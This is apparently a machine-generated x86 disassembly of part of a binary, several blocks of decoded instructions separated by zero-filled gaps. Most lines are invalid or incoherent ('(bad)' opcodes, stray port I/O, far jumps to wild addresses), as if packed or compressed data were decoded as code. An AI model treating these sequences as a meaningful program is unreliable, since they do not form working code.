  42d2c9:	add    BYTE PTR [eax],al
  42d2cb:	add    BYTE PTR [ebp-0x5e43b118],dh
  42d2d1:	stos   BYTE PTR es:[edi],al
  42d2d2:	das    
  42d2d3:	loopne 0x42d2de
  42d2d5:	fnstcw WORD PTR [eax]
  42d2d7:	mov    dh,0x9a
  42d2d9:	sbb    DWORD PTR [ebp+esi*4-0x40],esi
  42d2dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2de:	or     al,BYTE PTR [esp+ecx*8]
  42d2e1:	loopne 0x42d2c6
  42d2e3:	aas    
  42d2e4:	clc    
  42d2e5:	mov    ebx,0xa0553db3
  42d2ea:	in     eax,0x49
  42d2ec:	mov    edx,0x82456328
  42d2f1:	addr16 rcr bh,0x8b
  42d2f5:	push   0x5d686317
  42d2fa:	or     ah,BYTE PTR [ecx+0x3382117f]
  42d300:	mov    bh,0x81
  42d302:	fsub   DWORD PTR [esi+ecx*4]
  42d305:	outs   dx,BYTE PTR ds:[esi]
  42d306:	nop
  42d307:	or     cl,BYTE PTR [eax]
  42d309:	in     al,0x79
  42d30b:	jmp    0xd7a9d5c3
  42d310:	les    ebx,FWORD PTR [eax+ecx*2+0x309baec9]
  42d317:	out    0x11,al
  42d319:	pop    ebp
  42d31a:	retf   0x99cd
  42d31d:	jl     0x42d2f0
  42d31f:	push   ds
  42d320:	outs   dx,BYTE PTR ds:[esi]
  42d321:	ret    0x90ff
  42d324:	mov    edi,0x7afec6dc
  42d329:	pop    ss
  42d32a:	mov    ds:0xb8d84133,al
  42d32f:	sbb    DWORD PTR [ecx+0x13efae65],ecx
  42d335:	mov    ds:0x8c9effdb,eax
  42d33a:	push   ecx
  42d33b:	jbe    0x42d38d
  42d33d:	jns    0x42d2cd
  42d33f:	inc    edx
  42d340:	push   esp
  42d341:	push   cs
  42d342:	or     ah,al
  42d344:	retf   0xc8f6
  42d347:	mov    ebx,0x40f6ef62
  42d34c:	dec    ecx
  42d34d:	cmp    eax,0x17f20cab
  42d352:	jmp    0x42d311
  42d354:	dec    ebx
  42d355:	jmp    0xd3b1:0xbd9b614e
  42d35c:	mov    ch,0xb6
  42d35e:	lds    edi,FWORD PTR [esi+0x39]
  42d361:	adc    BYTE PTR [esi-0x52f7f0ec],0x7b
  42d368:	dec    ecx
  42d369:	sub    al,0x28
  42d36b:	adc    DWORD PTR [ecx-0x47],ecx
  42d36e:	ins    DWORD PTR es:[edi],dx
  42d36f:	repnz or DWORD PTR [ebx+0x3a5c5e77],ecx
  42d376:	sahf   
  42d377:	mov    dl,0xe9
  42d379:	cld    
  42d37a:	lahf   
  42d37b:	xchg   ebx,eax
  42d37c:	xchg   esi,eax
  42d37d:	fisub  DWORD PTR [ebx-0x2d80cbe6]
  42d383:	dec    esi
  42d384:	ins    BYTE PTR es:[edi],dx
  42d385:	inc    eax
  42d386:	sub    eax,DWORD PTR [ebp-0x492970bc]
  42d38c:	mov    bh,0x20
  42d38e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d38f:	lahf   
  42d390:	dec    ebx
  42d391:	mov    dh,0xfa
  42d393:	ret    0xbd03
  42d396:	outs   dx,DWORD PTR ds:[esi]
  42d397:	clc    
  42d398:	xlat   BYTE PTR ds:[ebx]
  42d399:	inc    ebp
  42d39a:	jecxz  0x42d3c0
  42d39c:	test   BYTE PTR [edx],bl
  42d39e:	gs cs in eax,dx
  42d3a1:	jmp    0x2978:0xe079fb90
  42d3a8:	push   eax
  42d3a9:	sahf   
  42d3aa:	aas    
  42d3ab:	lods   al,BYTE PTR ds:[esi]
  42d3ac:	and    bh,0x5a
  42d3af:	nop
  42d3b0:	test   al,0x12
  42d3b2:	adc    BYTE PTR [ebp-0x287e8b57],cl
  42d3b8:	cmp    BYTE PTR [edx+0x4],cl
  42d3bb:	push   esp
  42d3bc:	fistp  WORD PTR [ecx+0x11]
  42d3bf:	cld    
  42d3c0:	aaa    
	...
  42d431:	add    BYTE PTR [eax],al
  42d433:	add    ah,ch
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0x37d0781
  42d442:	jno    0x42d421
  42d444:	pusha  
  42d445:	fiadd  WORD PTR [ecx]
  42d447:	add    ch,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    cl,bh
  42d44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d44e:	mov    edx,0x455994db
  42d453:	dec    edi
  42d454:	call   DWORD PTR [ebx-0x27]
  42d457:	adc    BYTE PTR [bx+di+0x4906],0xf
  42d45d:	cld    
  42d45e:	rol    DWORD PTR [esi+0x29],1
  42d461:	call   0x5c8a22f4
  42d466:	and    al,0x5c
  42d468:	mov    eax,ds:0x12dd77c7
  42d46d:	jmp    0x7d61:0xe3d95023
  42d474:	adc    DWORD PTR [esi-0x29],ebp
  42d477:	mov    bl,0x61
  42d479:	cdq    
  42d47a:	adc    eax,0xa9eea1cd
  42d47f:	inc    DWORD PTR [ebp+edi*2-0x46]
  42d483:	iret   
  42d484:	jp     0x42d4a2
  42d486:	mov    esp,DWORD PTR [ebx-0x6363807f]
  42d48c:	or     DWORD PTR [ebx-0x18c9039d],eax
  42d492:	dec    esi
  42d493:	mov    BYTE PTR [eax+0x19d8b6d8],dh
  42d499:	(bad)  
  42d49b:	in     al,dx
  42d49c:	pop    edi
  42d49d:	imul   esp,esp,0xffffff8d
  42d4a0:	clc    
  42d4a1:	adc    BYTE PTR [esi-0x47],0x0
  42d4a5:	jbe    0x42d438
  42d4a7:	sub    DWORD PTR [edx+edx*2],edx
  42d4aa:	loop   0x42d443
  42d4ac:	and    ebp,0x52
  42d4af:	xor    eax,0x8704cd9b
  42d4b4:	mov    ds:0xad52ede7,al
  42d4b9:	add    bl,BYTE PTR [edx]
  42d4bb:	jo     0x42d4d0
  42d4bd:	lock dec edi
  42d4bf:	xor    DWORD PTR [eax+0x45],esi
  42d4c2:	daa    
  42d4c3:	adc    BYTE PTR [eax+0x69],al
  42d4c6:	jno    0x42d47f
  42d4c8:	scas   al,BYTE PTR es:[edi]
  42d4c9:	push   0x7cae40
  42d4ce:	adc    edi,DWORD PTR [ecx+0x58]
  42d4d1:	cmp    eax,0xae6f3c77
  42d4d6:	pusha  
  42d4d7:	mov    ds:0xfb9f29e,eax
  42d4dc:	jl     0x42d4a3
  42d4de:	addr16 adc bh,dh
  42d4e1:	aaa    
  42d4e2:	(bad)  
  42d4e3:	enter  0xc7fe,0x81
  42d4e7:	adc    ebp,DWORD PTR [eax]
  42d4e9:	sub    ecx,DWORD PTR [ebx]
  42d4eb:	in     eax,0x5d
  42d4ed:	adc    ecx,edx
  42d4ef:	mov    fs,esi
  42d4f1:	pop    esi
  42d4f2:	push   edx
  42d4f3:	mov    al,ds:0xe652babc
  42d4f8:	jle    0x42d578
  42d4fa:	xor    ah,ah
  42d4fc:	jge    0x42d516
  42d4fe:	sti    
  42d4ff:	fldenv [eax+0x6a]
  42d502:	stos   DWORD PTR es:[edi],eax
  42d503:	lods   eax,DWORD PTR ds:[esi]
  42d504:	retf   0xc4b8
  42d507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d508:	sub    eax,0xbdae9a6e
  42d50d:	or     dl,bl
  42d50f:	js     0x42d4e9
  42d511:	(bad)  
  42d512:	test   al,0x35
  42d514:	push   ecx
  42d515:	test   eax,0x8e2a6592
  42d51a:	lods   al,BYTE PTR ds:[esi]
  42d51b:	pop    edx
  42d51c:	je     0x42d4bb
  42d51e:	retf   
  42d51f:	(bad)  
  42d520:	cld    
  42d521:	not    ecx
  42d523:	ins    DWORD PTR es:[edi],dx
  42d524:	fisttp DWORD PTR [esi-0x43aeb57e]
  42d52a:	or     eax,0x66ff2a7b
  42d52f:	jmp    0x42d574
  42d531:	cdq    
  42d532:	xchg   ebx,eax
  42d533:	xor    BYTE PTR [eax+0x685ef0a],bh
  42d539:	sub    DWORD PTR [ebx-0x75f2c135],ecx
  42d53f:	ins    BYTE PTR es:[edi],dx
  42d540:	jnp    0x42d542
	...
  42d5b2:	add    BYTE PTR [eax],al
  42d5b4:	pop    ebp
  42d5b5:	dec    eax
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	xor    edx,DWORD PTR [ebx-0x20aa2bd8]
  42d5c6:	add    DWORD PTR [eax],eax
  42d5c8:	cmc    
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    BYTE PTR [ebx+0x6],ch
  42d5ce:	and    al,0xa9
  42d5d0:	inc    ebx
  42d5d1:	xor    ch,BYTE PTR [edx+0x71]
  42d5d4:	lea    esi,[ebx-0x79]
  42d5d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5d8:	and    DWORD PTR [ecx],esi
  42d5da:	test   eax,0xfbf4b6a0
  42d5df:	inc    DWORD PTR [ecx]
  42d5e1:	inc    ecx
  42d5e2:	outs   dx,DWORD PTR ds:[esi]
  42d5e3:	mov    ecx,0xbf021f29
  42d5e8:	ins    BYTE PTR es:[edi],dx
  42d5e9:	jecxz  0x42d620
  42d5eb:	inc    edx
  42d5ec:	ja     0x42d5ad
  42d5ee:	test   al,0xc
  42d5f0:	xor    ebp,edx
  42d5f2:	pop    esi
  42d5f3:	adc    DWORD PTR [ecx-0x7e],ecx
  42d5f6:	retf   
  42d5f7:	sub    ch,BYTE PTR [ebx+0x51]
  42d5fa:	je     0x42d595
  42d5fc:	jnp    0x42d5a0
  42d5fe:	pop    ds
  42d5ff:	imul   ebp,DWORD PTR [eax-0x5b],0x1b4881b5
  42d606:	inc    esi
  42d607:	repz and eax,0xdae4e617
  42d60d:	jmp    0x42d61e
  42d60f:	(bad)  
  42d610:	adc    eax,0x9607500a
  42d615:	mov    ecx,DWORD PTR [esi]
  42d617:	xchg   BYTE PTR [eax+0x47],bl
  42d61a:	in     al,dx
  42d61b:	jg     0x42d616
  42d61d:	or     DWORD PTR [ebp+eiz*4-0x64],ebp
  42d621:	cmp    BYTE PTR [esi-0x1f],dh
  42d624:	inc    eax
  42d625:	xor    BYTE PTR [edi-0x5e1183ca],0xc8
  42d62c:	or     esp,ebp
  42d62e:	mov    ss,WORD PTR [ebx]
  42d630:	sti    
  42d631:	psubusb mm0,QWORD PTR [ebx-0x41027432]
  42d638:	cmp    BYTE PTR [ecx+0x43],bl
  42d63b:	cwde   
  42d63c:	fmul   DWORD PTR [ecx]
  42d63e:	mov    al,0x73
  42d640:	clc    
  42d641:	dec    ebp
  42d642:	mov    WORD PTR [edx],gs
  42d644:	pop    es
  42d645:	mov    bh,0x1c
  42d647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d648:	mov    edx,0x2469c37c
  42d64d:	clc    
  42d64e:	dec    ebp
  42d64f:	jo     0x42d5ea
  42d651:	mov    ah,0x12
  42d653:	jmp    0x42d646
  42d655:	fsub   DWORD PTR [esi-0x46]
  42d658:	outs   dx,BYTE PTR es:[esi]
  42d65a:	fistp  DWORD PTR [edx-0x7a]
  42d65d:	mov    esp,0x3929a2c2
  42d662:	adc    eax,0xc13268e7
  42d667:	pop    esi
  42d668:	out    dx,eax
  42d669:	fwait
  42d66a:	inc    esp
  42d66b:	daa    
  42d66c:	mov    DWORD PTR [edi],esi
  42d66e:	cwde   
  42d66f:	test   eax,0x405a08b2
  42d674:	inc    esp
  42d675:	pop    ss
  42d676:	push   ebx
  42d677:	mov    al,0x69
  42d679:	xchg   esp,eax
  42d67a:	sbb    DWORD PTR [esi+0x7a],ebx
  42d67d:	sbb    al,0x54
  42d67f:	inc    edx
  42d680:	push   esi
  42d681:	aaa    
  42d682:	(bad)  
  42d683:	fsub   DWORD PTR [esi+0x5e]
  42d686:	push   ebx
  42d687:	in     al,dx
  42d688:	mov    gs,esp
  42d68a:	cmp    eax,0x7ef6a165
  42d68f:	fs jno 0x42d67c
  42d692:	push   esi
  42d693:	inc    edx
  42d694:	hlt    
  42d695:	loopne 0x42d64a
  42d697:	ja     0x42d709
  42d699:	cmp    BYTE PTR [edi*4-0x2b33b6c9],bh
  42d6a0:	sar    bh,0xc8
  42d6a3:	adc    dh,BYTE PTR [edi+0x2a555f96]
  42d6a9:	mov    ebx,0x30ff160b
  42d6ae:	(bad)  
  42d6af:	stc    
  42d6b0:	mul    BYTE PTR [esi]
  42d6b2:	xchg   esi,eax
  42d6b3:	(bad)  
  42d6b4:	push   edx
  42d6b5:	mov    dl,0x25
  42d6b7:	aam    0xbd
  42d6b9:	lahf   
  42d6ba:	inc    ecx
  42d6bb:	mov    ebx,0xb25f398b
  42d6c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  42d731:	add    BYTE PTR [eax],al
  42d733:	add    BYTE PTR [eax],bh
  42d735:	mov    DWORD PTR [edx-0x6b],ebp
  42d738:	sti    
  42d739:	idiv   edi
  42d73b:	lods   eax,DWORD PTR ds:[esi]
  42d73c:	jne    0x42d70c
  42d73e:	adc    al,0x87
  42d740:	inc    edi
  42d741:	cwde   
  42d742:	retf   0x4aca
  42d745:	loopne 0x42d748
  42d747:	add    ch,dh
  42d749:	add    BYTE PTR [eax],al
  42d74b:	add    BYTE PTR [ebx-0x363657d2],cl
  42d751:	adc    dh,bl
  42d753:	push   eax
  42d754:	aad    0x2f
  42d756:	xor    al,0xff
  42d758:	lahf   
  42d759:	push   ebx
  42d75a:	dec    ecx
  42d75b:	xor    eax,ebp
  42d75d:	pusha  
  42d75e:	test   al,0xe7
  42d760:	icebp  
  42d761:	in     al,dx
  42d762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d763:	jno    0x42d7e4
  42d765:	and    bl,BYTE PTR [eax]
  42d767:	mov    cl,0xb5
  42d769:	inc    esp
  42d76a:	jo     0x42d713
  42d76c:	std    
  42d76d:	dec    ebp
  42d76e:	inc    edi
  42d76f:	and    eax,0xb957a94d
  42d774:	xchg   dh,bl
  42d776:	xchg   ebp,eax
  42d777:	push   esp
  42d778:	test   eax,0xbc026cb2
  42d77d:	push   ss
  42d77e:	(bad)  
  42d77f:	fs jp  0x42d702
  42d782:	or     DWORD PTR [edx+0x5a],ebp
  42d785:	pushf  
  42d786:	add    BYTE PTR [eax+ebp*8+0x67],ah
  42d78a:	and    DWORD PTR [esi],0x66f4929a
  42d790:	or     dh,ch
  42d792:	xor    dh,bh
  42d794:	test   al,0x2b
  42d796:	mov    cl,BYTE PTR [edx-0x3781a508]
  42d79c:	ins    DWORD PTR es:[edi],dx
  42d79d:	dec    ebx
  42d79e:	cld    
  42d79f:	jnp    0x42d810
  42d7a1:	aad    0x49
  42d7a3:	aas    
  42d7a4:	jbe    0x42d7c5
  42d7a6:	mov    ds,WORD PTR [esi+0x694e62dd]
  42d7ac:	(bad)  
  42d7ad:	jmp    0x42d7e9
  42d7af:	(bad)  
  42d7b0:	push   esi
  42d7b1:	mov    al,0xb1
  42d7b3:	inc    edx
  42d7b4:	outs   dx,BYTE PTR ds:[esi]
  42d7b5:	xor    BYTE PTR ds:0x70abbee7,al
  42d7bb:	and    BYTE PTR [edx],dl
  42d7bd:	pop    ds
  42d7be:	cmp    esi,DWORD PTR [eax+0x13]
  42d7c1:	mov    edx,0x7b898f17
  42d7c6:	sti    
  42d7c7:	add    bl,BYTE PTR [ecx-0x70b6c2f7]
  42d7cd:	daa    
  42d7ce:	push   eax
  42d7cf:	je     0x42d7f8
  42d7d1:	je     0x42d786
  42d7d3:	and    DWORD PTR [edi+0x73],0xccd577e6
  42d7da:	sbb    al,0x95
  42d7dc:	dec    edi
  42d7dd:	aam    0x74
  42d7df:	cmp    al,0xea
  42d7e1:	cdq    
  42d7e2:	jg     0x42d7cc
  42d7e4:	les    ebp,FWORD PTR [ebx+0x73719d89]
  42d7ea:	pop    eax
  42d7eb:	stc    
  42d7ec:	mov    ds:0x458441fe,al
  42d7f1:	addr16 fdivp st(3),st
  42d7f4:	inc    esp
  42d7f5:	or     ebp,eax
  42d7f7:	pop    edx
  42d7f8:	int    0xce
  42d7fa:	cmp    eax,0x574f2657
  42d7ff:	push   ebp
  42d800:	jp     0x42d7b2
  42d802:	in     al,0x68
  42d804:	out    0x98,eax
  42d806:	inc    edx
  42d807:	and    bh,BYTE PTR [ebx-0x1d959442]
  42d80d:	push   ebx
  42d80e:	mov    esp,0x3ecebd00
  42d813:	pushw  0xffa0
  42d816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d817:	popf   
  42d818:	dec    ebx
  42d819:	out    0x79,al
  42d81b:	mov    BYTE PTR [ebx],0xc3
  42d81e:	jecxz  0x42d89d
  42d820:	inc    esi
  42d821:	mov    eax,0xf4c8846b
  42d826:	and    DWORD PTR [ebp+0x6d546b86],edi
  42d82c:	(bad)  [ecx]
  42d82e:	in     al,0x70
  42d830:	imul   ecx,DWORD PTR [ebx-0x6cc49085],0xffffffa2
  42d837:	idiv   dh
  42d839:	xor    ah,BYTE PTR [eax-0x27a60465]
  42d83f:	test   al,0xf5
	...
  42d8b1:	add    BYTE PTR [eax],al
  42d8b3:	add    BYTE PTR [eax],dl
  42d8b5:	sbb    ecx,ecx
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0xbfdcc254
  42d8c1:	stc    
  42d8c2:	xor    BYTE PTR [edi+0x1e13f],ch
  42d8c8:	cmc    
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    BYTE PTR [esi],ch
  42d8cd:	cwde   
  42d8ce:	xchg   ebx,eax
  42d8cf:	ret    0xd0d1
  42d8d2:	jnp    0x42d881
  42d8d4:	mov    ds:0xec2b556b,eax
  42d8d9:	out    dx,al
  42d8da:	repz cmp dl,bh
  42d8dd:	ja     0x42d934
  42d8df:	and    edx,edx
  42d8e1:	addr16 jbe 0x42d88d
  42d8e4:	push   eax
  42d8e5:	push   0x37c4a37c
  42d8ea:	dec    esi
  42d8eb:	mov    esp,0xdcc757e0
  42d8f0:	fidivr WORD PTR [esi-0x14f9361]
  42d8f6:	push   0x54
  42d8f8:	lea    esp,[ecx]
  42d8fa:	sti    
  42d8fb:	jge    0x42d88a
  42d8fd:	lahf   
  42d8fe:	inc    ebp
  42d8ff:	add    bh,ch
  42d901:	dec    eax
  42d902:	pop    edi
  42d903:	test   al,0xd1
  42d905:	fist   DWORD PTR [ecx-0xa]
  42d908:	call   0x768:0xeb518c9d
  42d90f:	sub    DWORD PTR [eax-0x3607db37],eax
  42d915:	(bad)  
  42d916:	stc    
  42d917:	cmc    
  42d918:	or     BYTE PTR [eax-0x47ca156d],bl
  42d91e:	xchg   bh,cl
  42d920:	rcr    DWORD PTR [eax-0x4a],1
  42d923:	mov    ch,0xd6
  42d925:	inc    ebx
  42d926:	enter  0xbc7f,0x27
  42d92a:	out    0xb2,eax
  42d92c:	jnp    0x42d90d
  42d92e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d92f:	imul   edi,DWORD PTR [eax],0x87086758
  42d935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d936:	add    edx,edx
  42d938:	or     BYTE PTR [edi-0x3f],ch
  42d93b:	mov    al,0x88
  42d93d:	pop    ss
  42d93e:	popa   
  42d93f:	fs sbb esi,ebp
  42d942:	pop    esi
  42d943:	cdq    
  42d944:	imul   esp,DWORD PTR [ecx],0xffffffd9
  42d947:	pop    ecx
  42d948:	aas    
  42d949:	sbb    al,0x45
  42d94b:	repnz push ecx
  42d94d:	inc    ebp
  42d94e:	add    al,0x84
  42d950:	jb     0x42d95c
  42d952:	sti    
  42d953:	int    0x86
  42d955:	lock dec ebp
  42d957:	xor    ebp,esi
  42d959:	xchg   edx,eax
  42d95a:	mov    edi,0x1bb12fad
  42d95f:	in     eax,0xcb
  42d961:	rcl    BYTE PTR [eax],1
  42d963:	loope  0x42d999
  42d965:	jns    0x42d9d1
  42d967:	jmp    0x16b717c8
  42d96c:	pop    ss
  42d96d:	shr    DWORD PTR [ebp+0xe],1
  42d970:	sub    ebp,esp
  42d972:	bound  edx,QWORD PTR [esi-0x3a44f204]
  42d978:	inc    esp
  42d979:	pop    ecx
  42d97a:	das    
  42d97b:	fidiv  WORD PTR [ebx+0x37]
  42d97e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d97f:	dec    ebx
  42d980:	mov    bl,0x41
  42d982:	in     eax,dx
  42d983:	mov    WORD PTR [ebx+0x261ae51e],ds
  42d989:	sbb    eax,0x3fd174ae
  42d98e:	dec    esi
  42d98f:	(bad)  
  42d990:	out    dx,eax
  42d991:	popa   
  42d992:	mov    cl,BYTE PTR [ebx+edx*2]
  42d995:	leave  
  42d996:	out    0x9f,al
  42d998:	adc    bh,BYTE PTR ds:0x1d59a677
  42d99e:	pop    ss
  42d99f:	mov    bh,0xc3
  42d9a1:	mov    eax,0x93420439
  42d9a6:	daa    
  42d9a7:	lahf   
  42d9a8:	mov    bl,dh
  42d9aa:	inc    ecx
  42d9ab:	mov    BYTE PTR [esi-0x9],al
  42d9ae:	ror    DWORD PTR [edi-0x34ee2d38],0xa6
  42d9b5:	cld    
  42d9b6:	aad    0x95
  42d9b8:	dec    edx
  42d9b9:	mov    edi,0x955993a3
  42d9be:	imul   ebx,DWORD PTR [edi+0xbd],0x0
	...
  42da31:	add    BYTE PTR [eax],al
  42da33:	add    BYTE PTR [edi-0x2be7726],ah
  42da39:	push   ebx
  42da3a:	out    dx,eax
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	imul   ebx,DWORD PTR [esi-0x1dcbec17],0x1
  42da47:	add    ch,dh
  42da49:	add    BYTE PTR [eax],al
  42da4b:	add    BYTE PTR [ecx],bl
  42da4d:	add    DWORD PTR [eax-0x1f11f552],esp
  42da53:	sbb    BYTE PTR [edx+ebx*1-0x75],0x48
  42da58:	xchg   DWORD PTR [ebx+eiz*8],edi
  42da5b:	inc    esp
  42da5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da5d:	(bad)  
  42da5e:	stos   DWORD PTR es:[edi],eax
  42da5f:	fisub  WORD PTR [esi]
  42da61:	sub    ebp,DWORD PTR [ebp-0x1a05777b]
  42da67:	inc    eax
  42da68:	aas    
  42da69:	loop   0x42da79
  42da6b:	sbb    eax,0xcfd1516e
  42da70:	cld    
  42da71:	sti    
  42da72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da73:	mov    esi,0x1e65e3f2
  42da78:	xor    eax,0x79b2d8bd
  42da7d:	mov    ds:0x5fd41be,eax
  42da82:	pop    ebx
  42da83:	imul   edx,DWORD PTR [ecx-0x71d21953],0x43ca0739
  42da8d:	and    al,0x9a
  42da8f:	(bad)  
  42da91:	xor    cl,ah
  42da93:	mov    ds:0xeac15455,al
  42da98:	pop    edx
  42da99:	leave  
  42da9a:	sbb    ch,BYTE PTR [edi-0x67c598fe]
  42daa0:	stos   BYTE PTR es:[edi],al
  42daa1:	enter  0x9edd,0xb7
  42daa5:	dec    eax
  42daa6:	js     0x42da71
  42daa8:	jmp    0xbe9:0xad1cd46
  42daaf:	mov    dh,0x4b
  42dab1:	add    bl,BYTE PTR [eax-0x21]
  42dab4:	mov    esp,0x458dcd09
  42dab9:	jg     0x42da82
  42dabb:	sti    
  42dabc:	ds sbb al,0xac
  42dabf:	mov    edx,0xc0ac1555
  42dac4:	mov    ch,0xcb
  42dac6:	jg     0x42db29
  42dac8:	and    edx,edx
  42daca:	js     0x42db23
  42dacc:	pop    ds
  42dacd:	stos   DWORD PTR es:[edi],eax
  42dace:	mov    ch,0xf8
  42dad0:	add    eax,DWORD PTR [edi]
  42dad2:	xchg   ebp,eax
  42dad3:	jp     0x42db14
  42dad5:	int    0x86
  42dad7:	sub    al,0x65
  42dad9:	pop    es
  42dada:	xchg   edx,eax
  42dadb:	dec    eax
  42dadc:	dec    ebx
  42dadd:	add    bl,ah
  42dadf:	xchg   edx,eax
  42dae0:	adc    BYTE PTR [ebx-0x6b9917f],bl
  42dae6:	or     al,0xeb
  42dae8:	(bad)  
  42dae9:	int    0xc3
  42daeb:	xchg   esp,eax
  42daec:	adc    esp,DWORD PTR [edx+0x69f2f5e3]
  42daf2:	mov    al,0xbd
  42daf4:	sbb    DWORD PTR [edx-0x312eff4c],ecx
  42dafa:	xchg   esp,eax
  42dafb:	(bad)  
  42dafc:	mov    DWORD PTR [ebx+0x4809acb0],0x4569c538
  42db06:	mov    cl,0xed
  42db08:	push   es
  42db09:	sub    BYTE PTR [ecx+0x17],cl
  42db0c:	dec    edi
  42db0d:	push   0x24e3e336
  42db12:	dec    edi
  42db13:	or     DWORD PTR [eax],0x63
  42db16:	and    DWORD PTR [ebp+0x60],edx
  42db19:	jmp    0x42daa7
  42db1b:	call   0x471626c0
  42db20:	imul   edi,DWORD PTR [esp+0xc],0xffffffeb
  42db25:	mov    dh,0xef
  42db27:	shr    DWORD PTR [edi+ebp*2-0x56],cl
  42db2b:	pop    esp
  42db2c:	dec    ebp
  42db2d:	mov    esi,0xd7963980
  42db32:	pop    esp
  42db33:	or     ecx,DWORD PTR [esi]
  42db35:	out    dx,al
  42db36:	and    esi,edx
  42db38:	not    BYTE PTR [eax-0xa155dec]
  42db3e:	aas    
  42db3f:	dec    edx
  42db40:	icebp  
	...
  42dbb1:	add    BYTE PTR [eax],al
  42dbb3:	add    BYTE PTR [edi+0x2],bh
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0x26b4cb37,al
  42dbc3:	xor    BYTE PTR [ecx],ch
  42dbc5:	jecxz  0x42dbc8
  42dbc7:	add    ch,dh
  42dbc9:	add    BYTE PTR [eax],al
  42dbcb:	add    cl,ah
  42dbcd:	ins    BYTE PTR es:[edi],dx
  42dbce:	and    ecx,DWORD PTR [ebx+0x5021193f]
  42dbd4:	fiadd  WORD PTR [edi-0xeba2538]
  42dbda:	and    eax,0x78e426af
  42dbdf:	jae    0x42dbd5
  42dbe1:	jae    0x42dbe0
  42dbe3:	inc    esi
  42dbe4:	cmp    ebx,DWORD PTR [esi+0x38]
  42dbe7:	push   ds
  42dbe8:	or     BYTE PTR [edx+eiz*8-0x8ec4b77],0x88
  42dbf0:	loop   0x42dbce
  42dbf2:	sub    eax,0xd3ef7673
  42dbf7:	and    ch,al
  42dbf9:	in     eax,0x32
  42dbfb:	adc    edx,ebp
  42dbfd:	or     DWORD PTR [ecx+0xaf35bbc],ebp
  42dc03:	mov    ebp,0xb45bf39e
  42dc08:	aas    
  42dc09:	xor    ch,ah
  42dc0b:	dec    ebx
  42dc0c:	dec    ebx
  42dc0e:	aad    0x81
  42dc10:	ret    0xc773
  42dc13:	lock mov ecx,DWORD PTR es:[edi+ecx*1]
  42dc18:	in     al,dx
  42dc19:	data16 (bad) 
  42dc1b:	loopne 0x42dc14
  42dc1d:	repz adc DWORD PTR [ecx-0x31],edx
  42dc21:	mov    al,0x96
  42dc23:	pop    ss
  42dc24:	push   eax
  42dc25:	pop    DWORD PTR [ecx-0x1113d518]
  42dc2b:	or     eax,0x75549eaf
  42dc30:	(bad)  
  42dc31:	imul   esp,esi,0xffffff82
  42dc34:	mov    ecx,0x65610e78
  42dc39:	pop    ecx
  42dc3a:	mov    ecx,0x8a82a72e
  42dc3f:	fistp  QWORD PTR [esi]
  42dc41:	out    0x78,eax
  42dc43:	adc    edx,ebp
  42dc45:	lock fldenv [ebp+0x14]
  42dc49:	imul   ebx,DWORD PTR [edx-0x80],0x508654dc
  42dc50:	mul    DWORD PTR [ecx+eiz*4]
  42dc53:	mov    ebp,0xbb92c7e5
  42dc58:	pop    edx
  42dc59:	sbb    eax,0xdfcf4dfc
  42dc5e:	xor    al,bh
  42dc60:	out    dx,eax
  42dc61:	lods   al,BYTE PTR ds:[esi]
  42dc62:	idiv   DWORD PTR [eax-0x66]
  42dc65:	popa   
  42dc66:	xchg   ebx,eax
  42dc67:	inc    ecx
  42dc68:	push   ebp
  42dc69:	mov    eax,0xa0d70c24
  42dc6e:	(bad)  
  42dc6f:	or     al,0xab
  42dc71:	aas    
  42dc72:	fiadd  DWORD PTR [esi-0x1a797f2c]
  42dc78:	test   DWORD PTR [ebx],edi
  42dc7a:	and    dh,ch
  42dc7c:	adc    al,0xf5
  42dc7e:	sub    edx,esp
  42dc80:	sbb    eax,0x28a3aa6b
  42dc85:	add    al,0x96
  42dc87:	std    
  42dc88:	and    BYTE PTR [ebp+edx*1-0x2312a96e],cl
  42dc8f:	pop    ecx
  42dc90:	sub    al,0x63
  42dc92:	sbb    BYTE PTR [edx-0x17fc297e],ch
  42dc98:	fbstp  TBYTE PTR [eax]
  42dc9b:	(bad)  
  42dc9c:	dec    esp
  42dc9d:	fsubr  st,st(6)
  42dc9f:	xchg   ecx,esp
  42dca1:	int3   
  42dca2:	sbb    eax,0xe3be5c13
  42dca7:	xchg   ebp,eax
  42dca8:	imul   ebp,DWORD PTR [ecx+0xb],0xffffffb0
  42dcac:	dec    ebp
  42dcad:	add    cl,BYTE PTR [ecx-0x50]
  42dcb0:	jge    0x42dcdb
  42dcb2:	lds    esi,FWORD PTR [esi-0x2876454e]
  42dcb8:	xchg   ecx,eax
  42dcb9:	dec    ebp
  42dcba:	fistp  DWORD PTR [ecx]
  42dcbc:	jg     0x42dd28
  42dcbe:	out    dx,eax
  42dcbf:	(bad)  
  42dcc0:	fld    DWORD PTR [eax]
	...
